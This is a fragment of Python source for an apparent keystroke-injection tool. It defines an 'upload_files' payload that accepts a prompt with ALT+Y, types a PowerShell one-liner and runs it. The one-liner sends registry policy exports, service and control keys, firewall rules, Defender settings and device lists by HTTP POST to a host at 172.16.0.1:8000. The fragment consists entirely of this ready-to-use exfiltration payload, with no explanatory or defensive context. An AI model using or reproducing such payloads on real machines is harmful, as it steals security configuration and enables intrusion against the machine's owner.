    ...
    def _register_default_payloads(self):
        ...
        self.payloads['upload_files'] = {
            ...
            'commands': [
                ...
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 5000},
                {'action': 'type', 'text': '$files=@("HKLM_Policies.reg","HKCU_Policies.reg","Services.reg","Control.reg","firewall.wfw","defender.json","drivers.txt","devices.txt");foreach($f in $files){$p="C:\\$f";if(Test-Path $p){Invoke-WebRequest -Uri "http://172.16.0.1:8000" -Method POST -InFile $p -Headers @{"X-Filename"=$f} -UseBasicParsing}}'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 5000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
